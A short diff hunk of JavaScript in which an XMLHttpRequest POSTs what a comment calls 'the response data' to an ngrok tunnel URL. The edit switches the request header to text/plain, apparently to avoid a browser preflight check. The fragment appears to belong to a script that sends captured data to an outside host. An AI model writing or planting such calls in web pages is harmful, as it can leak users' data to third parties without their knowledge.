@@ -12,7 +12,7 @@
         // Send the response data to your logging endpoint
         var logReq = new XMLHttpRequest();
         logReq.open('POST', 'https://5e42-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app', true);
-        logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        logReq.setRequestHeader('Content-Type', 'text/plain');
         logReq.send('key=');
     };
 
